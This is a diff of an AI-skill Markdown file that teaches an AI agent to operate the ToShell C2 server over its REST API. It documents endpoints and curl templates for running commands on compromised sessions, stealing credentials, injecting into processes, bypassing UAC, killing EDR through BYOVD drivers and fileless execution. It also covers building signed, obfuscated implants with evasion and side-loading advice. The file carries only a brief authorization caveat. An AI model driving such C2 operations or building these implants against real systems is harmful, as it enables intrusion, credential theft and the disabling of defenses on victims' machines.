@@ -1,176 +1,218 @@
 ---
 name: toshell-api
-description: Remote-control a ToShell C2 team server through its REST API — authenticate (API key or JWT), discover sessions, run commands and built-in recon through the atomic /mcp/tools executor, fetch files/screenshots/credentials, drive async Agent runs and playbooks via SSE, and react to live WebSocket events. Use this skill whenever the user asks an AI to query or operate a ToShell server over HTTP.
+description: 通过 REST API 远程驱动 ToShell C2 团队服务器 —— 认证（X-API-Key / JWT）、会话与命令、文件、内存无文件执行（fileless）、BYOVD 驱动自检、载荷构建（签名 / 真 DLL / 落地建议）、读写设置、AI 工具面（/mcp/tools）、异步 Agent/剧本与 WebSocket 事件。当用户要求用脚本或 AI 通过 HTTP 操作 ToShell 时使用本技能。
 ---
 
-# ToShell C2 — 远程 REST API 调用（AI Skill）
+# ToShell C2 — REST API 调用参考（AI Skill）
 
-ToShell（服务端 Web 端口默认 `8080`、API 端口默认 `18081`）提供一套 REST + WebSocket 接口。本 Skill 教你**以一个外部 AI 的身份**安全、正确地远程调用它。所有端点、请求体、响应体均以本仓库源码为准（`internal/server/api` 路由清单见 `api.go`；前端调用契约见 `web/src/api/index.ts`）。
+**适用版本：v1.3.5（FINAL，勿写其它版本号）。** 端点与字段取自源码：路由见 `internal/server/api/api.go` 的 `setupRoutes`，响应形状见 `handlers_*.go`/`json_response.go`，配置键见 `configs/server.yaml.example`。
 
-> ⚠️ **授权纪律**：ToShell 是 C2 平台。只能操作**用户明确授权**的服务器与目标会话。涉及命令执行、凭据收集、进程注入、隧道、插件/内存加载等影响会话的操作，先确认用户意图；服务器处于「正常权限模式（consent_mode=normal）」时这些操作需先走审批端点。
-
----
+> ⚠️ **授权纪律**：只操作**用户明确授权**的服务器与目标会话；命令执行、凭据收集、注入、内存/驱动加载等影响会话的操作先确认用户意图，`ai.consent_mode=normal` 时还需走审批端点。
 
 ## 1. 连接与认证
 
-- 基础路径：`{scheme}://{host}:{api_port}/api/v1`（如 `http://127.0.0.1:18081/api/v1`）。
-- 健康检查（**免认证**）：`GET /api/v1/health` → `{"status":"ok",...}`。
-- 认证两种方式，二选一：
-  - **API Key**：请求头 `X-API-Key: <key>`（推荐给脚本/AI）。
-  - **JWT**：`Authorization: Bearer <token>`。JWT 通过 `POST /api/v1/login`（`Content-Type: application/x-www-form-urlencoded`，字段 `username`、`password`）获取 → `{"token":"..."}`。
-- 除 `health`、`login` 与个别免认证下载端点外，所有 `/api/v1/*` 都需要以上任一凭据；否则 `401 Unauthorized`。
-- 响应统一 JSON。错误形如 `{"error":"..."}`，HTTP 状态码表达语义（400 参数、401 未认证、404 不存在）。
+- 基础路径 `{scheme}://{host}:{api_port}/api/v1`；本地开发默认 `http://127.0.0.1:18081/api/v1`（`server.api_port`）。
+- 两种认证，二选一（`auth.*` 控制）：`X-API-Key: <key>`（脚本/Agent 首选，密钥在 `auth.api_keys`，可多个）或 `Authorization: Bearer <JWT>`；也接受 `?token=<JWT>`（WS/SSE/调试方便）。
+- 登录 `POST /login`，**body 是 JSON**（不是 form）：`{"username":"admin","password":"..."}` → `{"token":"...","username":"admin"}`。`auth.enabled=false` 时任意凭据都发 token；5 分钟内连续 5 次失败锁定 5 分钟 → `429`。
+- `GET /health`、`/login` 不经 API Key/JWT 中间件；`/api/v1/implant/*` 豁免 Web 防护。
+- **Web 防护（防测绘，`web.*`）在认证之前**：启用后所有请求都需 Basic 凭据 / 入口 Cookie / 有效 API Key 或 JWT；未认证时 `unauth_mode=disguise` 返回 **404**、`basic` 返回 401。故"health 免认证"只在 Web 防护关闭时成立，带凭据的脚本始终放行。
+- **错误信封** `{"error":"..."}`。**构建失败**经 `writeJSONError` 输出，含换行/引号的错误文本已转义，**是合法 JSON**，可直接 `JSON.parse`；其余 handler 用 `http.Error` 写字符串（`text/plain`），多为 `{"error":...}` 形状但不保证合法 JSON，解析失败时读原始文本。
+- 起步：`GET /health` → 带凭据 `GET /sessions`。
 
-**先做**：`GET /health` 确认可达 → 带凭据 `GET /sessions` 确认授权与在线会话。
+## 2. 端点总览
 
----
+`setupRoutes` 注册 **106 条 `/api/v1` 路由**（107 个方法+路径组合；另有 `/robots.txt`、`/__gate`、SPA 兜底）。除 `health`/`login`/`implant/*` 外均需认证。
 
-## 2. 首选执行通道：统一原子工具端点（推荐）
+- **认证/系统**：`POST /login`（`{username,password}`）· `GET /health` · `GET /system/stats`（goroutine/内存/会话数/uptime）· `GET /logs`（`?limit=1..1000` 默认 100、`?level=debug|info|warn|error`）· `GET /channels/health`（tcp/http/websocket/mqtt 在线数 + 运行监听器数）· `WS /ws/events`（见 §7）。
+- **会话**：`GET /sessions`（`{sessions[],count}`，status=`active`/`asleep`/`dead`）· `GET /sessions/{id}`（hostname/username/os/arch/pid/process_name/ip_addresses/domain/listener/listener_id/last_seen/comment…）· `PATCH /sessions/{id}`（`{comment}`）· `DELETE /sessions/{id}`（先下发 exit 再删记录）· `GET /sessions/{id}/capabilities`（`{features[],tabs{}}`，按 OS 推导）· `POST /sessions/{id}/interact`（下发命令，返回 task_id；`{command,args[],execute_type,timeout,task_type}`）· `POST /sessions/{id}/plugin`（`{plugin_id,args}`）· `POST /sessions/{id}/workflow`（`{template_id}`，内部转剧本 run）。
+- **任务**：`GET /tasks`（`?session_id=`）· `GET /tasks/stats` · `POST /tasks`（**仅创建**不推送）· `GET /tasks/{id}`（`TaskInfo`：status/output/error/exit_code/progress…）· `POST /tasks/{id}/cancel` · `DELETE /tasks/{id}`。状态 `pending`/`sent`/`completed`/`failed`/`timeout`（后三者终态）；task_id 必须来自响应，**不要自造**，要一次拿结果用 §3。
+- **文件**：`GET|POST /sessions/{id}/files`（列目录，`?path=` 默认 `C:\`）· `POST /sessions/{id}/files/download`（`{path}`）· `POST /sessions/{id}/files/upload`（1MB 分片 base64，`{upload_id,filename,path,size,offset,data,done}`，`upload_id` 不含 `/\:`）· `POST /sessions/{id}/files/delete`（`{path}`）· `GET /files/transfer`（`?session_id=&transfer_id=`，session_id 须 16 位 hex 或 UUID）。
+- **进程/Shell/注入/提权**：`GET /sessions/{id}/processes` · `DELETE /sessions/{id}/processes/{pid}` · `POST /sessions/{id}/bof`（`{data(base64),args}`）· `WS /sessions/{id}/shell`（文本帧即输入；输出含 `\x00CWD\x00<目录>`）· `GET /injection/methods`（remote_thread/apc/early_bird/thread_hijack/process_hollowing/dll）· `POST /sessions/{id}/inject`（`{method,pid,shellcode?,dll_path?}`，`method=spawn` 自动构建载荷）· `POST /sessions/{id}/injection`（加 target_pid/target_process_name/target_path/parent_pid）· `POST /sessions/{id}/auto-inject`（`{pid,method?}`）· `POST /sessions/{id}/spawn`（`{file_name}`）· `POST /sessions/{id}/privesc-uac`（仅 Windows，空 body，一次性 exe 经 fodhelper 高完整性回连）· `GET /sessions/{id}/persistence` + `/install`（`{method}`）+ `/remove` · `POST /sessions/{id}/fileless-exec`（见 §6）。
+- **凭据/截图/中继**：`POST /sessions/{id}/credentials`（`{action}`：all(默认)/browser/wifi/rdp/lsa）· `POST /sessions/{id}/screenshot`（结果在 `GET /tasks/{id}` 的 `output`，base64；`{monitor,max_width,format(auto|png|jpeg),quality(20-95)}`）· `POST /sessions/{id}/screen-stream`（`{action:start|stop,fps(1-10),quality,max_kbps,monitor,max_width,format}`）· `POST /sessions/{id}/relay`（`{action:start|stop,addr}`）· `GET /relay-nodes`。
+- **EDR/驱动**：`POST /sessions/{id}/edr/blind`（ntdll 脱钩+ETW patch+Autologger 清理）· `/edr/kill`（`{processes[]}`，空=植入端默认列表）· `/edr/byovd-load`（`{driver_b64,service_name,device_name,kill_ioctl?,name?,description?}`，先自检见 §8）· `/edr/byovd-unload`（`{service_name}`）· `/edr/byovd-kill`（`{pid|process_name,driver?,device?,ioctl?}`）· `/edr/ppl-kill`（`{processes[]}`）· `GET /drivers`、`GET /drivers/{name}/verify`、`GET /drivers/{name}/raw`（响应头 `X-Driver-*`）。
+- **载荷**：`GET /builders`（能力清单，含 `evasion`，见 §5）· `POST /builders`（**构建**，同步长耗时，见 §4）· `POST /builders/download`（按 `{id}`/`{name}` 下载，**绝不重新编译**）· `GET /implants`、`GET /implants/download/{name}` · `GET /implants/stored`（DB+目录合并，孤儿记录自动清理）· `GET /implants/stored/{id}`（`file:` 前缀=无 DB 记录的目录文件）· `GET /implants/stored/{id}/oneliner`（`{variants[],host,base_url,warning}`）· `DELETE /implants/{id}`。
+- **监听器**：`GET /listeners`（`connections`=实时在线会话数）· `POST /listeners`（201；`{name,type(tcp|http|websocket|mqtt),bind_addr,bind_port,public_addr,options{}}`）· `GET|PUT|DELETE /listeners/{id}`（PUT 对 `default-*` 同步写回配置，缺省字段保留）· `POST /listeners/{id}/start`（真实 bind，失败同步报错）· `POST /listeners/{id}/stop`。
+- **设置**：`GET /settings` · `PUT /settings`（见 §9）· `POST /settings/webhook/test`（`{url,content,format?,secret?}` → `{ok,platform,status_code,response,error}`）。
+- **插件/隧道/模板/情报**：`GET|POST /plugins`（上传为 multipart ≤50MB，字段 `file`（.exe/.dll/.bin/.raw/.sc/.o/.obj）+`description`，201）· `GET|DELETE /plugins/{id}`（204）· `POST /plugins/refresh` · `GET|POST /tunnels`（`{session_id,local_port}` 默认 1080）· `DELETE /tunnels/{id}`（`{id}` 即 session_id）· `GET|POST /templates`、`GET|PUT|DELETE /templates/{id}`（`{name,description,category,tasks[{task_type,data,timeout,wait}]}`）· `GET /workflows/{id}`（任务流=剧本 run 进度）· `GET /intel`（`?kind=ip|account|hash_ntlm|share|domain`）。
+- **AI**：`GET /mcp/tools` · `POST /mcp/tools/{name}`（见 §3）· `GET /copilot/status`（`{enabled,model,consent_mode,notice}`）· `POST /copilot/chat`（`{messages:[{role,content}]}` → `{reply,traces,pending_consents}`）· `POST /copilot/consent`（`{token,decision:allow|deny}`）· `POST /agent/chat`（`{messages[],session_id?}` → `{run_id,session_id,status}`，非阻塞）· `GET /agent/runs/{id}`（`{status,objective,plan,traces,timeline,reply}`）· `GET /agent/runs/{id}/events`（SSE：status/state/thinking/message/tool_start/tool_result/final/done）· `POST /agent/runs/{id}/cancel`、`/consent` · `GET /copilot/playbooks`、`POST /copilot/playbook/run`（`{playbook_id,session_id}` → `{run_id,status}`）· `GET /copilot/playbook/runs`（最近 50）与 `/runs/{id}`（步骤 results + 异步生成的 AI `analysis`）。
+- **植入端协议**（免 Web 防护，脚本一般不用）：`POST /implant/register`、`/heartbeat`、`/result`；`GET /implant/payload/{id}`（免认证载荷下载）、`GET /implant/uac/{token}`（一次性 UAC 载荷，读取即删）。
 
-`POST /api/v1/mcp/tools/{tool}` —— 本平台为 AI 归一化的工具面，**一次调用即返回最终结果**（服务端自动创建→推送→等待→回传），不需要你自行拼 task_id 轮询。参数为扁平 JSON 字符串对象 `{"session_id":"...", "command":"..."}`。
+## 3. AI 工具面：`/mcp/tools`（首选执行通道）
 
-- 发现可用工具：`GET /api/v1/mcp/tools`（返回 `tools[]` 名称/描述）。
-- 常用工具（已原子化，见 `handlers_mcp.go` / `copilot.go` toolSchemas）：
-  - `session_list`、`session_context{session_id}`
-  - `exec{session_id, command 或 kind, timeout_sec?}` —— 命令执行首选；`kind` 可省为内置语义命令（user_info/system_info/service_list/check_av/net_info/net_connections/env_vars/scheduled_tasks）
-  - `file_list{session_id,path}`、`file_download{session_id,path}`
-  - `process_list{session_id}`、`process_kill{session_id,pid}`
-  - `screenshot{session_id}`、`credentials{session_id,action?}`（action: all/browser/wifi/rdp/lsa）
-  - `plugin_list`、`plugin_load{session_id,plugin_id,args?}`、`tunnel_start{session_id,local_port?}`、`tunnel_list`、`tunnel_stop{session_id}`
-  - `intel_query{kind?}`（跨会话情报库）、`web_search{query}`、`remote_download{url}`
-- 结果形状（exec/读类）：`{"session_id","task_id","status":"completed|failed|timeout","output":"...","exit_code":0,"error":""}`。`status=completed` 且 `exit_code==0` 即成功；`failed`/`timeout` 读 `error` 与 `output`。
-- **不存在** `task_wait`/`task_submit`（已从 AI 工具面移除以杜绝 task_id 编造）；不要试图猜测任务号。
-
-```bash
-# 示例：对会话执行命令（Windows 目标）
-curl -sk -X POST http://127.0.0.1:18081/api/v1/mcp/tools/exec \
-  -H "X-API-Key: $KEY" -H "Content-Type: application/json" \
-  -d '{"session_id":"5041edce2618d318","command":"whoami /groups"}'
-```
-
----
-
-## 3. 原始 REST 端点（Web 控制台同源；部分为 task 异步式）
-
-> 能用第 2 节原子工具完成的操作优先用工具面；以下端点用于完整覆盖或与前端行为对齐。
-
-### 会话
-| 方法/路径 | 说明 |
-| --- | --- |
-| `GET /sessions` | 会话列表：`{"sessions":[{id,hostname,username,os,arch,pid,status,listener,first_seen,last_seen,...}],"count":N}`；status: `active` 在线 / `asleep` / `dead` |
-| `GET /sessions/{id}` | 单会话详情 |
-| `PATCH /sessions/{id}` `{"comment":"..."}` | 更新备注 |
-| `DELETE /sessions/{id}` | 删除（向植入端下发 exit）|
-| `GET /sessions/{id}/capabilities` | 能力探测 |
-
-### 任务（异步式：返回 task_id → `GET /tasks/{id}` 轮询终态）
-| 端点 | 触发动作 |
-| --- | --- |
-| `POST /sessions/{id}/interact` `{"command":"...","task_type":"command"}` | 下发命令（返回 task_id）|
-| `GET /tasks?session_id={id}` / `GET /tasks/{task_id}` | 查询任务状态/output/error/exit_code |
-| `POST /tasks/{id}/cancel`、`DELETE /tasks/{id}` | 取消 / 删除 |
-| `POST /sessions/{id}/files/...`、`POST /sessions/{id}/processes` 等 | 文件/进程操作（也返回 task）|
-| `POST /sessions/{id}/credentials` `{"action":"all"}` | 凭据收集 |
-| `POST /sessions/{id}/screenshot`（空 body） | 截屏 → 结果经 `GET /tasks/{task_id}` 取（`output` 含 base64）|
-| `POST /sessions/{id}/screen-stream` `{"action":"start"|"stop"}` | 屏幕流启停 |
-| `POST /sessions/{id}/plugin`、`/sessions/{id}/injection`、`/fileless-exec`、`/privesc-uac` 等 | 高级动作 |
-
-任务轮询约定：`status ∈ {completed, failed, timeout}` 即终态；task_id 必须来自响应，**不要自造**。
-
-### 副驾驶 / Agent（异步、流式）
-| 方法/路径 | 说明 |
-| --- | --- |
-| `GET /copilot/status` | `{"enabled","model","consent_mode"}` |
-| `POST /copilot/chat` `{"messages":[{role,content}]}` | 单轮（同步，带工具闭环），`{"reply","traces","pending_consents?"}` |
-| `POST /copilot/consent` `{"token","decision":"allow|deny"}` | 处理 normal 模式审批 |
-| `POST /agent/chat` `{"messages":[...], "session_id"?}` | **创建/续接异步 agent run** → `{"run_id","session_id","status"}`（非阻塞）|
-| `GET /agent/runs/{id}` | `{"status","objective","plan","traces","timeline","reply"}` |
-| `GET /agent/runs/{id}/events` | SSE：`thinking/message/tool_start/tool_result/final/done` |
-| `POST /agent/runs/{id}/cancel`、`POST /agent/runs/{id}/consent` `{"decision"}` | 取消 / 审批 |
-
-Agent 工作流（推荐给 AI 使用）：
-1. `POST /agent/chat` 传消息与可选的 `session_id`（续接同一自主记忆），拿 `run_id`。
-2. `GET /agent/runs/{id}` 轮询（1–2s）直到 `status ∈ {done,error,awaiting_consent}`；或用 `GET /agent/runs/{id}/events` 订阅 SSE。
-3. 终态读 `reply`（最终答复）与 `timeline`（工具执行过程，可直接引用给用户）。
-4. 极短消息（≤2 字，如「1」「好」）走纯聊通道，返回一两句，不要当执行指令。
-5. 若 `status=awaiting_consent` 且 `consent_mode=normal`：把待确认操作展示给用户，经 `/agent/runs/{id}/consent` 后继续轮询。
-
-### 剧本（确定性多步执行）
-| 方法/路径 | 说明 |
-| --- | --- |
-| `GET /copilot/playbooks` | 内置 + 自定义模板合一列表 |
-| `POST /copilot/playbook/run` `{"playbook_id","session_id"}` | 启动 → `{"run_id","status"}` |
-| `GET /copilot/playbook/runs` / `GET /copilot/playbook/runs/{id}` | 运行列表 / 单次（`results[]`、`analysis`）|
-
-AI 建议模板：任务完成 → 先给简短「执行结果摘要」，AI 深度分析可能晚到（服务端异步生成）——若暂时无 `analysis`，**不要谎称失败**，可先给基于 `results` 的摘要并说明分析生成中，稍后重查该 run。
-
-### 情报 / 其它
-- `GET /intel`：跨会话情报库条目。
-- `GET /system/stats`、`GET /channels/health`、`GET /logs`、`GET /tunnels`、`GET /plugins`、`GET /listeners`、`GET /templates`。
-- `GET /mcp/tools` 仍是发现 AI 工具面的最权威入口。
-
----
-
-## 4. 实时事件（WebSocket）
-
-`GET /api/v1/ws/events?token=<JWT>`（或 `Authorization: Bearer`）——推送类型：
-`session_online / session_offline`（上线/下线/复活，全监听器统一广播）、`task_completed / task_failed`、`screen_frame`（实时屏幕帧）。适合做仪表盘联动、会话状态即时感知；无需轮询会话列表。
-
----
-
-## 5. 完整 AI 操作工作流（推荐顺序）
-
-1. **确认目标与授权**：问清/确认 server 地址、凭据与用户要做的动作（侦察？命令？凭据？）。
-2. `GET /health` → 带凭据 `GET /sessions`：列出在线会话（`status=active`）。
-3. 需要上下文：`POST /mcp/tools/session_context`（原子）或 `GET /sessions/{id}`。
-4. 按意图分派：
-   - **只问建议/思路**：`GET /copilot/status` → 直接给出结构化建议，不自动执行链。
-   - **执行命令/内置侦察**：`POST /mcp/tools/exec`（一次一命令，看 output）。
-   - **信息收集**：按固定清单逐项 exec（user_info/system_info/net_info/process_list/check_av…），拿到即收敛，最后汇总成结构化报告；不要对同一命令重复调用。
-   - **自主长任务**：`POST /agent/chat` + 轮询/SSE。
-   - **确定链路**：`POST /copilot/playbook/run` + `GET /copilot/playbook/runs/{id}`。
-5. **汇报**：给结论与关键输出，不要倾倒原始大 JSON；截图等 base64 只报「已获取/大小/用途」，大内容提示可另存。
-
----
-
-## 6. 错误处理与守则
-
-- `401`：凭据缺失/过期 → 重新 login 或要求正确 API Key。
-- `404 {"error":"session not found"}`：会话 ID 错或已删除 → 重新 `GET /sessions` 用活跃 ID。
-- `{"status":"timeout"}` / `exit_code:-1`：任务超时可能仍在跑；不要立刻重发同一命令，先说明。
-- 判断会话在线**只看** `session.status` / `session_context` 返回，禁止臆测「会话掉线」。
-- 高危（kill/删除/注入/凭据/隧道/插件加载）：先征得用户同意；normal 模式下走审批端点。
-- 命令输出可能很大：展示时截断；不要把任务原始输出无脑全文粘贴。
-- 不暴露 API Key / token 于日志与对话正文以外的位置；示例用 `$KEY` 占位。
-- 诚实：工具失败、分析未生成、会话离线都要如实说明，并给可执行的替代（换会话/换工具/重试说明）。
-
----
-
-## 7. 快速参考（curl 模板）
+`POST /api/v1/mcp/tools/{tool}`：服务端自动完成 创建→推送→轮询→归位，**一次调用返回最终结果**，不必自己拼 task_id 轮询。body 是扁平**字符串** map（数字也写字符串）：
 
 ```bash
-BASE=http://127.0.0.1:18081/api/v1
-KEY=your-api-key
-AUTH=(-H "X-API-Key: $KEY" -H "Content-Type: application/json")
-
-# 健康 & 会话
-curl -sk $BASE/health
-curl -sk "${AUTH[@]}" $BASE/sessions
-
-# 原子执行（推荐）
-curl -sk -X POST "${AUTH[@]}" $BASE/mcp/tools/exec \
-  -d '{"session_id":"<SID>","command":"whoami"}'
-
-# 异步 Agent
-RUN=$(curl -sk -X POST "${AUTH[@]}" $BASE/agent/chat \
-  -d '{"messages":[{"role":"user","content":"对会话 <SID> 做信息收集并输出报告"}]}')
-echo "$RUN"                      # {"run_id":...}
-curl -sk "${AUTH[@]}" $BASE/agent/runs/<RUN_ID>      # 轮询到 done，读 reply/timeline
-
-# 剧本
-curl -sk -X POST "${AUTH[@]}" $BASE/copilot/playbook/run \
-  -d '{"playbook_id":"custom-<ID>","session_id":"<SID>"}'
-curl -sk "${AUTH[@]}" $BASE/copilot/playbook/runs/<RUN_ID>
+curl -s -X POST "$BASE/mcp/tools/exec" -H "X-API-Key: $KEY" -H 'Content-Type: application/json' \
+  -d '{"session_id":"<SID>","command":"whoami /groups","timeout_sec":"60"}'
 ```
 
-> 版本契约：本文面向 v1.3.x（`go run ./cmd/server -version` 可查）。端点以当前运行服务 `GET /api/v1/mcp/tools` 与源码为准；如与本文不符，以运行服务为准并回写本文。
+`GET /mcp/tools` 返回 **37 个工具**（源码 `mcpToolList`）：原子执行/侦察 `exec`、`run_command`、`user_info`、`system_info`、`service_list`、`check_av`、`net_info`、`net_connections`、`env_vars`、`scheduled_tasks`；异步编排 `task_submit`（返回 task_id）、`task_result`（当前状态）、`task_wait`（轮询至终态，1–300s）——**三者真实存在**；会话 `session_list`、`session_context`、`session_kill`、`attack_suggest`；剧本 `delegate`（`playbook_id`+`session_id` 或逗号分隔 `session_ids`）、`playbook_status`；文件/进程/凭据 `file_list`、`file_download`、`process_list`、`process_kill`、`screenshot`、`credentials`；插件/隧道 `plugin_list`、`plugin_load`、`plugin_upload`、`tunnel_start`、`tunnel_list`、`tunnel_stop`；内存加载/工具管理 `fileless_exec`、`remote_download`、`tool_download_status`、`tool_list`；情报 `intel_query`、`web_search`。
+
+原子读类结果：`{session_id,task_id,task_type,command,status:"completed|failed|timeout",output,exit_code,error}`；`timeout:true` = 等待超时但任务仍在跑。会话不存在或非 `active` 时**立即**报错，不空等满超时。
+
+## 4. 载荷构建：`POST /api/v1/builders`
+
+> **路径提示**：真实路径是 `POST /api/v1/builders`（**没有** `/builders/build`）。构建同步且长耗时（首次拉依赖、garble 30–90s、UPX），客户端超时设 ≥5 分钟。
+
+| 字段 | 说明 |
+| --- | --- |
+| `name` | 载荷名；空 = `implant-<unix 秒>` |
+| `format` | `exe`(默认)/`dll`/`shellcode`(hex 文本)/`shellcode_bin`/`raw`（builder 也接受 `bin`/`so`） |
+| `language` | `go`(默认，全功能)/`c`（约 50KB，仅 Windows exe，需 mingw gcc） |
+| `os`/`arch` | `windows`(默认)/`linux`/`darwin`；`amd64`/`386`/`arm64` |
+| `listener_id` | 自动填 `server_url`/`protocol`（优先 `public_addr`，否则 `bind_addr`，`0.0.0.0`→localhost；websocket→`ws://`、mqtt→`mqtt://`） |
+| `server_url`/`protocol` | 手工回连地址与协议（`http`(默认)/`https`/`tcp`/`websocket`/`mqtt`）；`protocol=tcp` 时 `http(s)://` 前缀自动剥离（`ws://` 保留） |
+| `interval`/`jitter` | 心跳间隔(秒)/抖动(%)。**省略(0) 时优先跟随服务端配置** `implant.interval`/`implant.jitter`（示例配置 60/20），配置也为 0 才回退内置兜底 **60s / 20%**；`jitter` ≤100 |
+| `retry_count`/`retry_wait` | 省略 = 3 / 5 |
+| `kill_date`/`working_hours`/`relay_listen`/`front_domain` | 自杀日期 / 允许时段 / 中继监听 / 域前置（可空） |
+| `profile` | `full`(默认)/`light`（精简减体积） |
+| `download_host` | 一键上线命令的下载地址；留空按 监听器 public_host → 控制台访问地址 → server_url 主机 → 本机内网 IP 逐级解析；反代/CDN 填 `https://c2.example.com` |
+| `startup_delay_min`/`startup_delay_max` | 启动随机延迟(秒)；0 = 取服务端 `implant.startup_delay_*`，再回退 2~10s |
+| `xor_encrypt`/`xor_key_size`/`garble_enabled`/`upx_enabled` | XOR 混淆 / garble / UPX（后两者需构建机具备，见 §5） |
+| `evasion_scan` | 主动反沙箱进程检测，**默认关**；枚举全系统进程比对安全软件进程名后延迟执行，会带入 toolhelp32 静态导入与进程名字符串 |
+| `sign_enabled` | 构建后 Authenticode 签名；**证书只在服务端配置**（`builder.sign_*`），请求只能开关 |
+| `bof_enabled` | BOF（Beacon Object File）支持，**默认关 / opt-in**：开启会让载荷带整套 `Beacon*` API 名（22 处 pclntab 明文）。**兼容性选项，不是免杀功能**，只在确实要跑 BOF 时开 |
+| `dll_export` | 仅 `format=dll`：导出函数名（`rundll32 payload.dll,<名字>`），留空 = `Start`；须匹配 `^[A-Za-z_][A-Za-z0-9_]{0,63}$` |
+| `dll_autostart` | 仅 `format=dll`：是否"DLL 加载即启动"（白加黑宿主不一定调导出函数）。**不传/null = true**；`false` = 只导出、加载不自动启动 |
+
+响应 `BuildResponse`：
+
+```json
+{"id":"build-1730000000000000000","name":"dev-exe","format":"exe","size":3162044,"sha256":"…",
+ "build_time":"2025-01-01T00:00:00Z","download_url":"/api/v1/implants/stored/build-1730000000000000000",
+ "one_liner":"…","one_liner_host":"…","one_liner_base":"https://…","one_liner_warning":"…",
+ "one_liners":[{"name":"…","os":"windows","shell":"CMD","desc":"…","command":"…","note":"…"}],
+ "signed":true,"signer":"CN=YourName","sign_method":"signtool","sign_status":"Valid","sign_message":"代码签名成功",
+ "loader_advice_title":"…","loader_advice_tips":["…","…"]}
+```
+
+- `id` 即 **build id**；下载用 `GET /implants/stored/{id}`（带认证）或免认证 `GET /implant/payload/{id}`，不要当文件名用。
+- `signed`/`signer`/`sign_method`/`sign_status`/`sign_message`：未启用签名时为零值/缺省；`sign_status` 可为 `Valid`/`NotSigned`/`UnknownError`（自签根未导入时 `UnknownError` = "已签名但链不受信任"，属预期）；`sign_message` 是中文失败/跳过原因；`sign_fail_closed=true` 时签名失败直接让构建报错。
+- `loader_advice_title`/`loader_advice_tips`：按平台/格式 + 本次是否签名给出的**落地链建议**。
+- 免杀表述按项目三分法：**落地 delivery**（代码签名、白加黑 DLL 侧加载、计划任务+已签名宿主、内存加载 shellcode）/ **动态免杀**（休眠期内存加密 sleep mask、去 RWX、`NtDelayExecution` 替代 `Sleep`、AMSI/ETW patch）/ **静态降特征**（字符串混淆、pclntab 中性化、BOF 按需编译、Go 指纹擦除、UPX/garble）。静态降特征 ≠ 免杀，免杀 ≠ 能落地；`bof_enabled` 属兼容性选项。
+
+## 5. 构建/免杀能力：`GET /api/v1/builders`
+
+> **路径提示**：**没有** `/builders/evasion` 路由；`sign_configured`/`bof_default`/`dll_arch` 都在 `GET /api/v1/builders` 的 `evasion` 对象里。
+
+响应含 `formats[]`、`protocols[]`、`os[]`、`arch[]`、`listeners[]`、`languages{go,c,c_message}`、`options{interval,jitter,retry_count,retry_wait:{min,max,default}}`，以及 `evasion`：
+
+- `garble_available`/`garble_message`、`upx_available`：构建机是否具备 garble / UPX。
+- `sign_configured`/`sign_message`：是否已配好签名证书（PFX 或证书指纹）与用哪套签名栈。
+- `bof_default: false`：BOF 默认不编译（勾选才带 `Beacon*`）。
+- `dll_available`/`dll_message`：**amd64** 的兼容字段；**按架构判断请读 `dll_arch`**（每项含 `available`+`message`），如：
+
+```json
+"dll_arch":{"amd64":{"available":true,"message":"可用：…/x86_64-w64-mingw32-gcc.exe"},
+ "386":{"available":false,"message":"DLL 载荷需要与目标架构一致的 mingw-w64 gcc：请求 386，但本机只有 x86_64-w64-mingw32-gcc（…）"},
+ "arm64":{"available":false,"message":"…"}}
+```
+
+`format=dll` 走 `-buildmode=c-shared`+CGO，需要**与目标架构一致**的 mingw gcc：amd64 → `x86_64-w64-mingw32-gcc`，386 → i686 mingw（`i686-w64-mingw32-gcc`），arm64 同理。只有 x64 工具链时 386 DLL 会在构建阶段明确报错，而不是产出坏 DLL。
+
+## 6. Fileless 内存执行与 PE 预检
+
+`POST /api/v1/sessions/{id}/fileless-exec`，body `{kind,payload_b64,args?,entry?,arch?,wait_ms?,force?}`。`kind`：`shellcode`（VirtualAlloc+CreateThread）/ `bof`（内存 COFF，`args` 为 BOF 参数）/ `dll`（反射映射，`entry` 指定导出函数）/ `exe`（服务端 donut 转 shellcode，`args` 为被转程序命令行 ≤255 字节，`arch` 默认 amd64）/ `exe_mem`（不走 donut，植入端反射映射 EXE，须同架构，`args` 经 PEB 注入，`wait_ms>0` 时等线程结束回传退出码）。
+
+对 `dll`/`exe_mem`/`exe`，服务端先解码 base64 做**静态 PE 预检**（`InspectPE`+`DetectGoBinary`+`CheckMemoryExec`），结论 `ok`/`warn`/`reject`：
+
+| 判定 | 含义 |
+| --- | --- |
+| `reject` | `dll`/`exe_mem` 是同进程反射映射，以下硬边界会**直接打崩宿主植入体**：① **载荷是 Go 编译产物**（双 Go runtime：调度器/mspan/信号栈互相踩踏，实测崩宿主）；② **架构不匹配**（反射映射不做指令集翻译）；③ **带 CLR 目录（.NET 程序集）**（无 CLR 宿主环境）。`kind=exe`（donut）时一律降级为 `warn`，只提示不阻断 |
+| `warn` | 允许下发但带 `warnings[]`：**TLS 目录（TLS 回调）**——反射映射不执行 TLS 回调/CRT TLS 初始化；**无重定位表且非 DLL**——换基址后绝对地址无法修正，失败率高；**kind 与文件类型不符**（`exe_mem` 发 DLL / `dll` 发 EXE）。另外载荷不是合法 PE 时：`dll`/`exe_mem` 直接 400，`exe` 记一条"donut 只接受 PE，转换预计失败"的警告后仍交给 donut |
+| `ok` | 无额外提示 |
+
+- `force:true` 是**逃生门**：`reject` 也照常下发，但服务端 Warn 日志留痕、响应回传被拒原因 + "目标机可能崩溃/掉线"提示。不加 `force` 时 `reject` 返回 **HTTP 400 JSON**：`{error,reasons[],suggestion,pe_info{machine,is_64bit,is_dll,has_tls,has_clr,is_go},preflight_verdict,go_evidence?}`，**不下发任务**。
+- 成功响应 `{task_id,task_type,kind,args,message}`，按需附 `warnings[]`/`suggestion`/`pe_info`/`preflight_verdict`。
+- 诚实说明：预检是**静态 PE 头判定**，只能拦住已知崩宿主边界；"内存执行在目标机上是否成功/是否被 AV 拦"只能在授权目标机实测。
+
+## 7. 实时事件（WebSocket）
+
+`GET /api/v1/ws/events`（`?token=<JWT>` 或认证头）。帧 `{type,payload,time}`：`session_online`/`session_offline`（全监听器统一广播，带去抖）、`task_completed`/`task_failed`（`{task_id,task_type,session_id,exit_code,output|error}`，output 截断 200 字符）、`screen_frame`（实时屏幕帧，按会话帧率合并/丢帧）。也可直接轮询 `GET /sessions`。
+
+## 8. 驱动加载前自检（BYOVD）
+
+服务端**不内置任何驱动**：把 `.sys` 放到 `drivers/`、`data/drivers/` 或服务端 exe 同目录 `drivers/`，可选同目录 `manifest.json` 声明 `file/name/purpose(kill|rw)/device/service/ioctl/kill_pid_size/signed/sha256`。
+
